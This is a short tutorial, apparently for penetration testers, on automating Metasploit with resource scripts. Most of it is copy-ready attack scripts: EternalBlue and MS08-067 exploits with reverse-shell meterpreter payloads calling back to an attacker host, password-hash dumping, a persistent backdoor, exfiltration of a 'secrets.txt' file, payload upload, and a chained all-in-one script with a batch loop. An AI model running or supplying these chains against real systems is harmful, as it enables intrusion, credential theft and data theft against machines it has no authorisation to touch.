Metasploit resource scripts (`.rc` files) are used to automate tasks within the Metasploit Framework. These scripts allow for repeatable execution of commands, making them useful for automating exploitation, post-exploitation, and data exfiltration.

#### Creating and Using Resource Scripts

A resource script is a plain text file containing a sequence of Metasploit commands.

##### Basic Structure of a Resource Script

Create a script (`automation.rc`) with the following content:

```bash
use exploit/windows/smb/ms08_067_netapi
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.200
set LPORT 4444
exploit
```

Run the script in Metasploit:

```bash
msfconsole -r automation.rc
```

#### Automating Exploitation with Resource Scripts

Resource scripts can be used to automate common exploitation steps.

##### Example: Automating an SMB Exploit

```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.105
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.200
set LPORT 4444
run
```

Save it as `smb_exploit.rc` and execute:

```bash
msfconsole -r smb_exploit.rc
```

#### Post-Exploitation Automation

Resource scripts can be used for privilege escalation, persistence, and data collection.

##### Example: Gathering System Information

```bash
use post/windows/gather/enum_system
set SESSION 1
run
```

##### Example: Extracting Password Hashes

```bash
use post/windows/gather/hashdump
set SESSION 1
run
```

#### Creating a Persistent Backdoor

```bash
use exploit/windows/local/persistence
set SESSION 1
set LHOST 192.168.1.200
set LPORT 4444
run
```

#### Exfiltrating Files with Metasploit

##### Downloading a File from Target

```bash
use post/windows/manage/download
set SESSION 1
set REMOTE_FILE C:\\Users\\Admin\\Documents\\secrets.txt
set LOCAL_DIRECTORY /root/
run
```

##### Uploading a File to Target

```bash
use post/windows/manage/upload
set SESSION 1
set SRC /root/payload.exe
set DST C:\\Users\\Public\\payload.exe
run
```

#### Combining Resource Scripts for Full Automation

Multiple tasks can be combined into a single `.rc` file:

```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.105
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.200
set LPORT 4444
exploit -z

use post/windows/gather/hashdump
set SESSION 1
run

use post/windows/manage/download
set SESSION 1
set REMOTE_FILE C:\\Users\\Admin\\Documents\\secrets.txt
set LOCAL_DIRECTORY /root/
run
```

#### Executing Multiple Resource Scripts in a Loop

```bash
for script in $(ls /root/scripts/*.rc); do
    msfconsole -r $script
done
```

Metasploit resource scripts streamline repetitive tasks, making them valuable for efficient penetration testing and post-exploitation automation.